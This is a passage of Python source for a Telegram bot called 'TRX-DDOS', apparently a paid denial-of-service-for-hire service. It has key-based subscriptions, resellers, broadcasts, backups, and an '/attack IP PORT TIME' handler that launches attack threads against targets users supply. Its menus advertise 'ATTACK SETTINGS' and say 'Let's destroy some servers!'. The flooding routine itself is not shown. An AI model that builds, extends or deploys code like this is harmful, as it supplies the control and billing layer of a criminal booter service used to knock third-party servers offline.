/broadcast Bot will be down at 10 PM
/broadcast New update available!
━━━━━━━━━━━━━━━━━━━━━━━━""")
        return
    
    broadcast_msg = " ".join(args)
    
    full_msg = f"""
━━━━━━━━━━━━━━━━━━━━━━━━
📢 ADMIN BROADCAST
━━━━━━━━━━━━━━━━━━━━━━━━
{broadcast_msg}
━━━━━━━━━━━━━━━━━━━━━━━━
📅 {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
👑 TRX-DDOS
━━━━━━━━━━━━━━━━━━━━━━━━"""
    
    send_msg(chat_id, "⏳ Sending broadcast to all users...")
    
    total_users = 0
    success_count = 0
    fail_count = 0
    
    for uid in list(users.keys()):
        if int(uid) == GHOST_OWNER_ID:
            continue
        total_users += 1
        try:
            requests.post(
                f"https://api.telegram.org/bot{TOKEN}/sendMessage",
                json={"chat_id": int(uid), "text": full_msg},
                timeout=3
            )
            success_count += 1
        except:
            fail_count += 1
        time.sleep(0.02)
    
    for rid in list(resellers.keys()):
        if rid not in users and int(rid) != GHOST_OWNER_ID:
            total_users += 1
            try:
                requests.post(
                    f"https://api.telegram.org/bot{TOKEN}/sendMessage",
                    json={"chat_id": int(rid), "text": full_msg},
                    timeout=3
                )
                success_count += 1
            except:
                fail_count += 1
            time.sleep(0.02)
    
    send_msg(chat_id, f"""
━━━━━━━━━━━━━━━━━━━━━━━━
✅ BROADCAST COMPLETE
━━━━━━━━━━━━━━━━━━━━━━━━
📊 Total Users: {total_users}
✅ Sent: {success_count}
❌ Failed: {fail_count}
━━━━━━━━━━━━━━━━━━━━━━━━""")

def handle_multibroadcast(chat_id, user_id):
    if not is_admin(user_id):
        send_msg(chat_id, "❌ Admin only!")
        return
    
    multibroadcast_state[user_id] = True
    send_msg(chat_id, "📤 Please send your message (text, video, photo, document, sticker, audio, voice, animation) to broadcast to ALL users.\n\nSend /cancel to cancel.")

def handle_multibroadcast_send(chat_id, user_id, msg):
    if user_id not in multibroadcast_state:
        return False
    
    del multibroadcast_state[user_id]
    
    all_users = set()
    
    for uid in users.keys():
        uid_int = int(uid)
        if uid_int != GHOST_OWNER_ID:
            all_users.add(uid_int)
    
    for rid in resellers.keys():
        rid_int = int(rid)
        if rid_int != GHOST_OWNER_ID:
            all_users.add(rid_int)
    
    for aid in ADMIN_IDS:
        if aid != GHOST_OWNER_ID:
            all_users.add(aid)
    
    if not all_users:
        send_msg(chat_id, "❌ No users found!")
        return True
    
    send_msg(chat_id, f"⏳ Sending broadcast to {len(all_users)} users...")
    
    success_count = 0
    fail_count = 0
    
    for uid in all_users:
        try:
            if 'text' in msg:
                requests.post(
                    f"https://api.telegram.org/bot{TOKEN}/sendMessage",
                    json={"chat_id": uid, "text": msg['text']},
                    timeout=5
                )
            elif 'video' in msg:
                requests.post(
                    f"https://api.telegram.org/bot{TOKEN}/sendVideo",
                    json={"chat_id": uid, "video": msg['video']['file_id'], "caption": msg.get('caption', '')},
                    timeout=10
                )
            elif 'photo' in msg:
                requests.post(
                    f"https://api.telegram.org/bot{TOKEN}/sendPhoto",
                    json={"chat_id": uid, "photo": msg['photo'][-1]['file_id'], "caption": msg.get('caption', '')},
                    timeout=10
                )
            elif 'document' in msg:
                requests.post(
                    f"https://api.telegram.org/bot{TOKEN}/sendDocument",
                    json={"chat_id": uid, "document": msg['document']['file_id'], "caption": msg.get('caption', '')},
                    timeout=10
                )
            elif 'animation' in msg:
                requests.post(
                    f"https://api.telegram.org/bot{TOKEN}/sendAnimation",
                    json={"chat_id": uid, "animation": msg['animation']['file_id'], "caption": msg.get('caption', '')},
                    timeout=10
                )
            elif 'sticker' in msg:
                requests.post(
                    f"https://api.telegram.org/bot{TOKEN}/sendSticker",
                    json={"chat_id": uid, "sticker": msg['sticker']['file_id']},
                    timeout=10
                )
            elif 'audio' in msg:
                requests.post(
                    f"https://api.telegram.org/bot{TOKEN}/sendAudio",
                    json={"chat_id": uid, "audio": msg['audio']['file_id'], "caption": msg.get('caption', '')},
                    timeout=10
                )
            elif 'voice' in msg:
                requests.post(
                    f"https://api.telegram.org/bot{TOKEN}/sendVoice",
                    json={"chat_id": uid, "voice": msg['voice']['file_id']},
                    timeout=10
                )
            
            success_count += 1
        except Exception as e:
            fail_count += 1
            print(f"Failed to send to {uid}: {e}")
        
        time.sleep(0.02)
    
    send_msg(chat_id, f"""
━━━━━━━━━━━━━━━━━━━━━━━━
✅ MULTIBROADCAST COMPLETE
━━━━━━━━━━━━━━━━━━━━━━━━
📊 Total Users: {len(all_users)}
✅ Sent: {success_count}
❌ Failed: {fail_count}
━━━━━━━━━━━━━━━━━━━━━━━━""")
    
    return True

def handle_cancel_multibroadcast(chat_id, user_id):
    if user_id in multibroadcast_state:
        del multibroadcast_state[user_id]
        send_msg(chat_id, "❌ Broadcast cancelled!")
        return True
    return False

def handle_alluser(chat_id, user_id):
    if not is_admin(user_id):
        send_msg(chat_id, "❌ Admin only!")
        return
    
    filtered_users = {}
    for uid, expiry in users.items():
        uid_int = int(uid)
        if uid_int not in ADMIN_IDS and uid_int != GHOST_OWNER_ID:
            filtered_users[uid] = expiry
    
    filtered_resellers = {}
    for rid, data in resellers.items():
        rid_int = int(rid)
        if rid_int not in ADMIN_IDS and rid_int != GHOST_OWNER_ID:
            filtered_resellers[rid] = data
    
    if not filtered_users and not filtered_resellers:
        send_msg(chat_id, "📋 No users found!")
        return
    
    user_list = []
    expired_users = []
    
    for uid, expiry in filtered_users.items():
        remaining = expiry - time.time()
        if remaining <= 0:
            expired_users.append(f"🆔 `{uid}` | ❌ EXPIRED")
        else:
            days = int(remaining // 86400)
            hours = int((remaining % 86400) // 3600)
            user_list.append(f"🆔 `{uid}` | ✅ {days}d {hours}h")
    
    reseller_list = []
    for rid, data in filtered_resellers.items():
        if data.get('unlimited', False):
            reseller_list.append(f"🆔 `{rid}` | ∞ UNLIMITED")
        else:
            reseller_list.append(f"🆔 `{rid}` | 💰 {data['tokens']} tokens")
    
    total_users = len(filtered_users) + len(filtered_resellers)
    active_users = len(user_list) + len(reseller_list)
    expired_count = len(expired_users)
    
    msg = f"""
━━━━━━━━━━━━━━━━━━━━━━━━
📊 ALL USERS / RESELLERS
━━━━━━━━━━━━━━━━━━━━━━━━
📈 Total: {total_users} | ✅ Active: {active_users} | ❌ Expired: {expired_count}
━━━━━━━━━━━━━━━━━━━━━━━━"""
    
    if user_list:
        msg += f"\n\n👥 ACTIVE USERS ({len(user_list)}):\n"
        msg += "\n".join(user_list[:20])
        if len(user_list) > 20:
            msg += f"\n... and {len(user_list) - 20} more"
    
    if expired_users:
        msg += f"\n\n⚠️ EXPIRED USERS ({len(expired_users)}):\n"
        msg += "\n".join(expired_users[:10])
        if len(expired_users) > 10:
            msg += f"\n... and {len(expired_users) - 10} more"
    
    if reseller_list:
        msg += f"\n\n💼 RESELLERS ({len(reseller_list)}):\n"
        msg += "\n".join(reseller_list)
    
    send_msg(chat_id, msg[:4000])

def get_users_json_clean():
    filtered_users = {}
    filtered_key_map = {}
    
    for uid, expiry in users.items():
        uid_int = int(uid)
        if uid_int not in ADMIN_IDS and uid_int != GHOST_OWNER_ID:
            filtered_users[uid] = expiry
    
    for uid, key in user_key_map.items():
        uid_int = int(uid)
        if uid_int not in ADMIN_IDS and uid_int != GHOST_OWNER_ID:
            filtered_key_map[uid] = key
    
    data = {
        "export_date": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
        "total_users": len(filtered_users),
        "users": filtered_users,
        "user_key_map": filtered_key_map
    }
    return json.dumps(data, indent=2)

def get_resellers_json_clean():
    filtered_resellers = {}
    
    for rid, info in resellers.items():
        rid_int = int(rid)
        if rid_int not in ADMIN_IDS and rid_int != GHOST_OWNER_ID:
            filtered_resellers[rid] = info
    
    data = {
        "export_date": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
        "total_resellers": len(filtered_resellers),
        "resellers": filtered_resellers
    }
    return json.dumps(data, indent=2)

def get_keys_json_clean():
    data = {
        "export_date": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
        "total_keys": len(keys),
        "keys": keys
    }
    return json.dumps(data, indent=2)

def restore_users_from_json(json_content):
    try:
        data = json.loads(json_content)
        if 'users' in data:
            global users, user_key_map
            restored_count = 0
            for uid, expiry in data['users'].items():
                uid_int = int(uid)
                if uid_int not in ADMIN_IDS and uid_int != GHOST_OWNER_ID:
                    users[uid] = expiry
                    restored_count += 1
            if 'user_key_map' in data:
                for uid, key in data['user_key_map'].items():
                    uid_int = int(uid)
                    if uid_int not in ADMIN_IDS and uid_int != GHOST_OWNER_ID:
                        user_key_map[uid] = key
            save_data()
            return True, f"✅ Restored {restored_count} users!"
        return False, "❌ Invalid users JSON format!"
    except Exception as e:
        return False, f"❌ Error: {str(e)}"

def restore_resellers_from_json(json_content):
    try:
        data = json.loads(json_content)
        if 'resellers' in data:
            global resellers
            restored_count = 0
            for rid, info in data['resellers'].items():
                rid_int = int(rid)
                if rid_int not in ADMIN_IDS and rid_int != GHOST_OWNER_ID:
                    resellers[rid] = info
                    restored_count += 1
            save_data()
            return True, f"✅ Restored {restored_count} resellers!"
        return False, "❌ Invalid resellers JSON format!"
    except Exception as e:
        return False, f"❌ Error: {str(e)}"

def restore_keys_from_json(json_content):
    try:
        data = json.loads(json_content)
        if 'keys' in data:
            global keys
            for key, key_data in data['keys'].items():
                keys[key] = key_data
            save_data()
            return True, f"✅ Restored {len(data['keys'])} keys!"
        return False, "❌ Invalid keys JSON format!"
    except Exception as e:
        return False, f"❌ Error: {str(e)}"

def handle_getjson(chat_id, user_id):
    if not is_admin(user_id):
        send_msg(chat_id, "❌ Admin only!")
        return
    
    send_msg(chat_id, "⏳ Generating JSON backups...")
    
    users_json = get_users_json_clean()
    send_document(chat_id, users_json, "users.json")
    time.sleep(0.5)
    
    resellers_json = get_resellers_json_clean()
    send_document(chat_id, resellers_json, "resellers.json")
    time.sleep(0.5)
    
    keys_json = get_keys_json_clean()
    send_document(chat_id, keys_json, "keys.json")
    
    user_count = len([u for u in users if int(u) not in ADMIN_IDS and int(u) != GHOST_OWNER_ID])
    reseller_count = len([r for r in resellers if int(r) not in ADMIN_IDS and int(r) != GHOST_OWNER_ID])
    
    send_msg(chat_id, f"""
━━━━━━━━━━━━━━━━━━━━━━━━
✅ JSON BACKUP COMPLETE
━━━━━━━━━━━━━━━━━━━━━━━━
📄 users.json → Sent
📄 resellers.json → Sent
📄 keys.json → Sent
━━━━━━━━━━━━━━━━━━━━━━━━
📊 Statistics:
├ 👥 Users: {user_count}
├ 💼 Resellers: {reseller_count}
└ 🔑 Keys: {len(keys)}
━━━━━━━━━━━━━━━━━━━━━━━━""")

def handle_boton(chat_id, user_id):
    global is_bot_off
    if not is_owner(user_id):
        send_msg(chat_id, "❌ Only owner can use this command!")
        return
    
    is_bot_off = False
    save_data()
    send_msg(chat_id, """
━━━━━━━━━━━━━━━━━━━━━━━━
✅ BOT IS NOW ONLINE!
━━━━━━━━━━━━━━━━━━━━━━━━
All commands are now working.
Users can use the bot normally.
━━━━━━━━━━━━━━━━━━━━━━━━""")

def handle_botoff(chat_id, user_id):
    global is_bot_off
    if not is_owner(user_id):
        send_msg(chat_id, "❌ Only owner can use this command!")
        return
    
    is_bot_off = True
    save_data()
    send_msg(chat_id, """
━━━━━━━━━━━━━━━━━━━━━━━━
❌ BOT IS NOW OFFLINE!
━━━━━━━━━━━━━━━━━━━━━━━━
Bot is offline. No commands will work for users.
Owner commands still work.
Use /boton to bring it back online.
━━━━━━━━━━━━━━━━━━━━━━━━""")

def handle_myplan(chat_id, user_id):
    if is_bot_off and not is_owner(user_id):
        return
    
    if str(user_id) not in users and not is_admin(user_id) and not is_reseller(user_id):
        send_msg(chat_id, """
━━━━━━━━━━━━━━━━━━━━━━━━
❌ NO ACTIVE PLAN!
━━━━━━━━━━━━━━━━━━━━━━━━
You don't have an active subscription.
Use /redeem KEY to get access.
━━━━━━━━━━━━━━━━━━━━━━━━""")
        return
    
    if is_admin(user_id):
        send_msg(chat_id, f"""
━━━━━━━━━━━━━━━━━━━━━━━━
👑 ADMIN PLAN 👑
━━━━━━━━━━━━━━━━━━━━━━━━
🌟 Plan: PREMIUM 💎
⏳ Remaining: LIFETIME
📅 Expiry: NEVER

⚙️ Limits:
├ ⏱️ Max Time: {MAX_TIME}s
├ ⏳ Cooldown: 0s
└ 📊 Daily Attacks: Unlimited

👑 Admin privileges!
━━━━━━━━━━━━━━━━━━━━━━━━""")
        return
    
    if is_reseller(user_id):
        tokens = get_reseller_tokens(user_id)
        send_msg(chat_id, f"""
━━━━━━━━━━━━━━━━━━━━━━━━
💼 RESELLER PLAN 💼
━━━━━━━━━━━━━━━━━━━━━━━━
🌟 Plan: PREMIUM 💎
⏳ Remaining: LIFETIME
📅 Expiry: NEVER
🎫 Tokens: {tokens}

⚙️ Limits:
├ ⏱️ Max Time: {MAX_TIME}s
├ ⏳ Cooldown: 0s
└ 📊 Daily Attacks: Unlimited

💼 Reseller access!
━━━━━━━━━━━━━━━━━━━━━━━━""")
        return
    
    user_id_str = str(user_id)
    plan_type = "BASIC"
    if user_id_str in user_key_map:
        redeemed_key = user_key_map[user_id_str]
        if redeemed_key in keys:
            plan_type = keys[redeemed_key].get('type', 'basic').upper()
    
    remaining_time = get_user_remaining_time(user_id)
    expiry_date = get_user_expiry_date(user_id)
    today_attacks = get_today_attack_count(user_id)
    
    if plan_type == "PREMIUM":
        send_msg(chat_id, f"""
━━━━━━━━━━━━━━━━━━━━━━━━
💎 YOUR ACTIVE PLAN 💎
━━━━━━━━━━━━━━━━━━━━━━━━
🌟 Plan: PREMIUM 💎
⏳ Remaining: {remaining_time}
📅 Expiry: {expiry_date}

⚙️ Limits:
├ ⏱️ Max Time: {MAX_TIME}s
├ ⏳ Cooldown: {COOLDOWN_SECONDS}s
└ 📊 Daily Attacks: {DAILY_LIMIT - today_attacks} left today

💎 Enjoy your premium access!
━━━━━━━━━━━━━━━━━━━━━━━━""")
    else:
        send_msg(chat_id, f"""
━━━━━━━━━━━━━━━━━━━━━━━━
📀 YOUR ACTIVE PLAN 📀
━━━━━━━━━━━━━━━━━━━━━━━━
⚡ Plan: BASIC ⚡
⏳ Remaining: {remaining_time}
📅 Expiry: {expiry_date}

⚙️ Limits:
├ ⏱️ Max Time: {MAX_TIME}s
├ ⏳ Cooldown: {COOLDOWN_SECONDS}s
└ 📊 Daily Attacks: {DAILY_LIMIT - today_attacks} left today

📀 Enjoy your basic access!
━━━━━━━━━━━━━━━━━━━━━━━━""")

def handle_start(chat_id, user_id):
    if is_bot_off and not is_owner(user_id):
        return
    
    if chat_id < 0 and not is_group_allowed(chat_id):
        send_msg(chat_id, """
━━━━━━━━━━━━━━━━━━━━━━━━
❌ This group is not approved yet!
━━━━━━━━━━━━━━━━━━━━━━━━
Contact @TG_DEVILOP for approval.
━━━━━━━━━━━━━━━━━━━━━━━━""")
        return
    
    if not is_user(user_id) and not is_reseller(user_id):
        send_msg(chat_id, """
━━━━━━━━━━━━━━━━━━━━━━━━
🚀 Welcome to Premium Bot 🚀
━━━━━━━━━━━━━━━━━━━━━━━━
⚔️ /attack IP PORT TIME - Start attack
📊 /status - Check active attacks
🆔 /id - Your ID
🔑 /redeem KEY - Redeem key
📋 /myplan - Check your plan
📜 /rules - Bot rules
ℹ️ /help - Help menu
━━━━━━━━━━━━━━━━━━━━━━━━
🔥 Let's destroy some servers!
━━━━━━━━━━━━━━━━━━━━━━━━""")
        return
    
    if is_admin(user_id):
        if is_owner(user_id):
            buttons = [
                [{"text": "🔒 LOCK", "callback_data": "admin_lock"}, {"text": "🔓 UNLOCK", "callback_data": "admin_unlock"}],
                [{"text": "🔧 MAINT ON", "callback_data": "admin_maint_on"}, {"text": "✅ MAINT OFF", "callback_data": "admin_maint_off"}],
                [{"text": "📊 STATUS", "callback_data": "admin_status"}]
            ]
            send_buttons(chat_id, f"""
━━━━━━━━━━━━━━━━━━━━━━━━  
   ⚡ OWNER PANEL ⚡    
━━━━━━━━━━━━━━━━━━━━━━━━
🔒 Lock: {'ON' if is_locked else 'OFF'}
🔧 Maintenance: {'ON' if is_maintenance else 'OFF'}
━━━━━━━━━━━━━━━━━━━━━━━━
📌 TRX-DDOS COMMANDS
━━━━━━━━━━━━━━━━━━━━━━━━
⚔️ /attack IP PORT TIME - Start attack
📊 /status - Check active attacks
🆔 /id - Your ID
🔑 /redeem KEY - Redeem key
📋 /myplan - Check your plan
📜 /rules - Bot rules
ℹ️ /help - Help menu
━━━━━━━━━━━━━━━━━━━━━━━━
👑 TRX-DDOS ADMIN
━━━━━━━━━━━━━━━━━━━━━━━━
👥 USER MANAGEMENT
/adduser ID DAYS - Add user
/removeuser ID - Remove user
/broadcast [MESSAGE] - Send to all users
/alluser - List all users
/multibroadcast - Broadcast any message to ALL
━━━━━━━━━━━━━━━━━━━━━━━━
👥 GROUP MANAGEMENT
/addgroup ID DAYS - Add group
/removegroup ID - Remove group
/groups - List groups
━━━━━━━━━━━━━━━━━━━━━━━━
⚙️ ATTACK SETTINGS
/settime SEC - Set max time
/setmaxconcurrent NUM - Set concurrent
/setcooldown SEC - Set cooldown
/setdaily LIMIT - Set daily limit
/settings - Show settings
━━━━━━━━━━━━━━━━━━━━━━━━
🔑 KEY MANAGEMENT
/genbasic PREFIX DURATION - Basic key
/genbasic PREFIX DURATION COUNT - Multiple basic
/genpremium PREFIX DURATION - Premium key
/genpremium PREFIX DURATION COUNT - Multiple premium
/keys - List keys
/deletekeys - Delete keys
/blockkey KEY - Block key
/unblockkey KEY - Unblock key
━━━━━━━━━━━━━━━━━━━━━━━━
💼 RESELLER MANAGEMENT
/addreseller ID TOKENS - Add reseller
/removereseller ID - Remove reseller
/resellers - List resellers
/unlimited ID - Make unlimited
/limited ID TOKENS - Make limited
━━━━━━━━━━━━━━━━━━━━━━━━
🔒 OWNER CONTROL
/lock - Lock bot
/unlock - Unlock bot
/maintenance on/off - Maintenance mode
/delvideo - Delete video
/boton - Turn bot ON
/botoff - Turn bot OFF
━━━━━━━━━━━━━━━━━━━━━━━━
💾 BACKUP COMMANDS
/getjson - Get all JSON backups
/uploaduserjson - Upload users.json
/uploadresellerjson - Upload resellers.json
/uploadkeysjson - Upload keys.json
━━━━━━━━━━━━━━━━━━━━━━━━""", buttons)
            return
        
        buttons = [
            [{"text": "🔒 LOCK", "callback_data": "admin_lock"}, {"text": "🔓 UNLOCK", "callback_data": "admin_unlock"}],
            [{"text": "🔧 MAINT ON", "callback_data": "admin_maint_on"}, {"text": "✅ MAINT OFF", "callback_data": "admin_maint_off"}],
            [{"text": "📊 STATUS", "callback_data": "admin_status"}]
        ]
        send_buttons(chat_id, f"""
━━━━━━━━━━━━━━━━━━━━━━━━  
   ⚡ ADMIN PANEL ⚡    
━━━━━━━━━━━━━━━━━━━━━━━━
🔒 Lock: {'ON' if is_locked else 'OFF'}
🔧 Maintenance: {'ON' if is_maintenance else 'OFF'}
━━━━━━━━━━━━━━━━━━━━━━━━
📌 TRX-DDOS COMMANDS
━━━━━━━━━━━━━━━━━━━━━━━━
⚔️ /attack IP PORT TIME - Start attack
📊 /status - Check active attacks
🆔 /id - Your ID
🔑 /redeem KEY - Redeem key
📋 /myplan - Check your plan
📜 /rules - Bot rules
ℹ️ /help - Help menu
━━━━━━━━━━━━━━━━━━━━━━━━
👑 TRX-DDOS ADMIN
━━━━━━━━━━━━━━━━━━━━━━━━
👥 USER MANAGEMENT
/adduser ID DAYS - Add user
/removeuser ID - Remove user
/broadcast [MESSAGE] - Send to all users
/alluser - List all users
/multibroadcast - Broadcast any message to ALL
━━━━━━━━━━━━━━━━━━━━━━━━
👥 GROUP MANAGEMENT
/addgroup ID DAYS - Add group
/removegroup ID - Remove group
/groups - List groups
━━━━━━━━━━━━━━━━━━━━━━━━
⚙️ ATTACK SETTINGS
/settime SEC - Set max time
/setmaxconcurrent NUM - Set concurrent
/setcooldown SEC - Set cooldown
/setdaily LIMIT - Set daily limit
/settings - Show settings
━━━━━━━━━━━━━━━━━━━━━━━━
🔑 KEY MANAGEMENT
/genbasic PREFIX DURATION - Basic key
/genbasic PREFIX DURATION COUNT - Multiple basic
/genpremium PREFIX DURATION - Premium key
/genpremium PREFIX DURATION COUNT - Multiple premium
/keys - List keys
/deletekeys - Delete keys
/blockkey KEY - Block key
/unblockkey KEY - Unblock key
━━━━━━━━━━━━━━━━━━━━━━━━
💼 RESELLER MANAGEMENT
/addreseller ID TOKENS - Add reseller
/removereseller ID - Remove reseller
/resellers - List resellers
/unlimited ID - Make unlimited
/limited ID TOKENS - Make limited
━━━━━━━━━━━━━━━━━━━━━━━━
🔒 BOT CONTROL
/lock - Lock bot
/unlock - Unlock bot
/maintenance on/off - Maintenance mode
/delvideo - Delete video
━━━━━━━━━━━━━━━━━━━━━━━━
💾 BACKUP COMMANDS
/getjson - Get all JSON backups
/uploaduserjson - Upload users.json
/uploadresellerjson - Upload resellers.json
/uploadkeysjson - Upload keys.json
━━━━━━━━━━━━━━━━━━━━━━━━""", buttons)
    
    elif is_reseller(user_id):
        tokens = get_reseller_tokens(user_id)
        keys_count = len(get_reseller_keys(user_id))
        blocked_count = len(get_reseller_blocked_keys(user_id))
        send_msg(chat_id, f"""
━━━━━━━━━━━━━━━━━━━━━━━━
  💼 RESELLER PANEL
━━━━━━━━━━━━━━━━━━━━━━━━
  🎫 Tokens: {tokens}
  🔑 Keys: {keys_count}
  🚫 Blocked: {blocked_count}
━━━━━━━━━━━━━━━━━━━━━━━━
📌 USER COMMANDS
/attack IP PORT TIME - Start Attack
/id - Get Your ID
/rules - Bot Rules
/redeem KEY - Get access
/myplan - Check your plan
━━━━━━━━━━━━━━━━━━━━━━━━
📌 RESELLER COMMANDS
/genkey - Generate Keys
/deletekey - Delete Your Keys
/blockkey KEY - Block Your Key
/unblockkey KEY - Unblock Your Key
/myblockedkeys - Show Blocked Keys
━━━━━━━━━━━━━━━━━━━━━━━━""")
    else:
        user_id_str = str(user_id)
        plan_display = "⚡ BASIC ⚡"
        if user_id_str in user_key_map:
            redeemed_key = user_key_map[user_id_str]
            if redeemed_key in keys and keys[redeemed_key].get('type') == 'premium':
                plan_display = "💎 PREMIUM 💎"
        
        expiry = get_user_expiry(user_id)
        send_msg(chat_id, f"""
━━━━━━━━━━━━━━━━━━━━━━━━
  ⚡ TRX-DDOS USER
━━━━━━━━━━━━━━━━━━━━━━━━
  ✅ Approved
  📅 Expires: {expiry}
  🌟 Plan: {plan_display}
━━━━━━━━━━━━━━━━━━━━━━━━
📌 COMMANDS
/attack IP PORT TIME - Start attack
/status - Check active attacks
/id - Your ID
/redeem KEY - Redeem key
/myplan - Check your plan
/rules - Bot rules
/help - Help menu
━━━━━━━━━━━━━━━━━━━━━━━━""")

def handle_attack(chat_id, user_id, username, args):
    if is_bot_off and not is_owner(user_id):
        return
    
    user_id_str = str(user_id)
    is_authorized = False
    
    if is_admin(user_id) or is_reseller(user_id):
        is_authorized = True
    elif user_id_str in users and time.time() < users[user_id_str]:
        if user_id_str in user_key_map:
            key = user_key_map[user_id_str]
            if not is_key_blocked(key):
                is_authorized = True
        else:
            is_authorized = True
    
    if not is_authorized:
        send_msg(chat_id, """
━━━━━━━━━━━━━━━━━━━━━━━━
❌ NO ACTIVE SUBSCRIPTION!
━━━━━━━━━━━━━━━━━━━━━━━━
You don't have an active plan.
Use /redeem KEY to get access.
━━━━━━━━━━━━━━━━━━━━━━━━""")
        return
    
    if is_locked and not is_admin(user_id):
        send_msg(chat_id, "🔒 Bot is locked!")
        return
    if is_maintenance and not is_admin(user_id):
        send_msg(chat_id, "🔧 Bot is under maintenance!")
        return
    if chat_id < 0 and not is_group_allowed(chat_id):
        send_msg(chat_id, "❌ This group is not authorized!")
        return
    
    valid, msg = is_user_valid(user_id)
    if not valid:
        send_msg(chat_id, msg)
        return
    
    current = len(active_attacks)
    if current >= MAX_CONCURRENT:
        send_msg(chat_id, f"""
━━━━━━━━━━━━━━━━━━━━━━━━
❌ MAX CONCURRENT LIMIT!
━━━━━━━━━━━━━━━━━━━━━━━━
⚡ Currently: {current}/{MAX_CONCURRENT}
⏳ Please wait for a free slot
━━━━━━━━━━━━━━━━━━━━━━━━""")
        return
    
    if len(args) != 3:
        send_msg(chat_id, "Usage: /attack IP PORT TIME\nExample: /attack 1.1.1.1 80 60")
        return
    
    ip, port, sec = args[0], int(args[1]), int(args[2])
    if sec < 10:
        sec = 10
    if sec > MAX_TIME:
        send_msg(chat_id, f"❌ Max duration is {MAX_TIME}s! You sent {sec}s")
        return
    
    can, can_msg = can_attack(user_id)
    if not can:
        send_msg(chat_id, can_msg)
        return
    
    attack_id = f"{int(time.time())}_{user_id}"
    
    with attack_lock:
        active_attacks[attack_id] = {
            'ip': ip, 'port': port, 'duration': sec, 'remaining': sec,
            'percent': 0, 'user_id': user_id, 'username': username,
            'start_time': time.time()
        }
    
    add_attack_count(user_id)
    
    threading.Thread(target=run_attack, args=(attack_id, chat_id, ip, port, sec, user_id, username), daemon=True).start()

def handle_status(chat_id, user_id):
    if is_bot_off and not is_owner(user_id):
        return
    
    if chat_id < 0 and not is_group_allowed(chat_id):
        send_msg(chat_id, "❌ This group is not authorized!")
        return
    
    send_status(chat_id, user_id)

def handle_redeem(chat_id, user_id, args):
    if is_bot_off and not is_owner(user_id):
        return
    
    if len(args) != 1:
        send_msg(chat_id, "Usage: /redeem KEY\nExample: /redeem TRX-ABCD1234")
        return
    success, msg = redeem_key(user_id, args[0].upper())
    send_msg(chat_id, msg)

def handle_id(chat_id, user_id):
    if is_bot_off and not is_owner(user_id):
        return
    
    if not is_user(user_id) and not is_reseller(user_id):
        send_msg(chat_id, "❌ Not approved!")
        return
    if is_admin(user_id):
        send_msg(chat_id, f"🆔 YOUR ID: {user_id}\n👑 ADMIN")
    elif is_reseller(user_id):
        tokens = get_reseller_tokens(user_id)
        send_msg(chat_id, f"🆔 YOUR ID: {user_id}\n💼 RESELLER\n🎫 Tokens: {tokens}")
    else:
        expiry = get_user_expiry(user_id)
        user_id_str = str(user_id)
        plan = "BASIC"
        if user_id_str in user_key_map:
            redeemed_key = user_key_map[user_id_str]
            if redeemed_key in keys and keys[redeemed_key].get('type') == 'premium':
                plan = "PREMIUM"
        send_msg(chat_id, f"🆔 YOUR ID: {user_id}\n✅ User\n📅 Expires: {expiry}\n🌟 Plan: {plan}")

def handle_rules(chat_id, user_id):
    if is_bot_off and not is_owner(user_id):
        return
    send_msg(chat_id, """
━━━━━━━━━━━━━━━━━━━━━━━━
📜 BOT RULES
━━━━━━━━━━━━━━━━━━━━━━━━
1. No spamming attacks
2. Play smart
3. No mods
4. Be respectful
5. Report issues 
━━━━━━━━━━━━━━━━━━━━━━━━""")

def handle_help(chat_id, user_id):
    if is_bot_off and not is_owner(user_id):
        return
    
    if chat_id < 0 and not is_group_allowed(chat_id):
        send_msg(chat_id, "❌ This group is not authorized!")
        return
    if is_admin(user_id):
        if is_owner(user_id):
            send_msg(chat_id, """
━━━━━━━━━━━━━━━━━━━━━━━━
👑 TRX-DDOS OWNER
━━━━━━━━━━━━━━━━━━━━━━━━
👥 USER MANAGEMENT
/adduser ID DAYS - Add user
/removeuser ID - Remove user
/broadcast [MESSAGE] - Send to all users
/alluser - List all users
/multibroadcast - Broadcast any message to ALL
━━━━━━━━━━━━━━━━━━━━━━━━
👥 GROUP MANAGEMENT
/addgroup ID DAYS - Add group
/removegroup ID - Remove group
/groups - List groups
━━━━━━━━━━━━━━━━━━━━━━━━
⚙️ ATTACK SETTINGS
/settime SEC - Set max time
/setmaxconcurrent NUM - Set concurrent
/setcooldown SEC - Set cooldown
/setdaily LIMIT - Set daily limit
/settings - Show settings
━━━━━━━━━━━━━━━━━━━━━━━━
🔑 KEY MANAGEMENT
/genbasic PREFIX DURATION - Basic key
/genbasic PREFIX DURATION COUNT - Multiple basic
/genpremium PREFIX DURATION - Premium key
/genpremium PREFIX DURATION COUNT - Multiple premium
/keys - List keys
/deletekeys - Delete keys
/blockkey KEY - Block key
/unblockkey KEY - Unblock key
━━━━━━━━━━━━━━━━━━━━━━━━
💼 RESELLER MANAGEMENT
/addreseller ID TOKENS - Add reseller
/removereseller ID - Remove reseller
/resellers - List resellers
/unlimited ID - Make unlimited
/limited ID TOKENS - Make limited
━━━━━━━━━━━━━━━━━━━━━━━━
🔒 OWNER CONTROL
/lock - Lock bot
/unlock - Unlock bot
/maintenance on/off - Maintenance mode
/delvideo - Delete video
/boton - Turn bot ON
/botoff - Turn bot OFF
━━━━━━━━━━━━━━━━━━━━━━━━
💾 BACKUP COMMANDS
/getjson - Get all JSON backups
/uploaduserjson - Upload users.json
/uploadresellerjson - Upload resellers.json
/uploadkeysjson - Upload keys.json
━━━━━━━━━━━━━━━━━━━━━━━━""")
        else:
            send_msg(chat_id, """
━━━━━━━━━━━━━━━━━━━━━━━━
👑 TRX-DDOS ADMIN
━━━━━━━━━━━━━━━━━━━━━━━━
👥 USER MANAGEMENT
/adduser ID DAYS - Add user
/removeuser ID - Remove user
/broadcast [MESSAGE] - Send to all users
/alluser - List all users
/multibroadcast - Broadcast any message to ALL
━━━━━━━━━━━━━━━━━━━━━━━━
👥 GROUP MANAGEMENT
/addgroup ID DAYS - Add group
/removegroup ID - Remove group
/groups - List groups
━━━━━━━━━━━━━━━━━━━━━━━━
⚙️ ATTACK SETTINGS
/settime SEC - Set max time
/setmaxconcurrent NUM - Set concurrent
/setcooldown SEC - Set cooldown
/setdaily LIMIT - Set daily limit
/settings - Show settings
━━━━━━━━━━━━━━━━━━━━━━━━
🔑 KEY MANAGEMENT
/genbasic PREFIX DURATION - Basic key
/genbasic PREFIX DURATION COUNT - Multiple basic
/genpremium PREFIX DURATION - Premium key
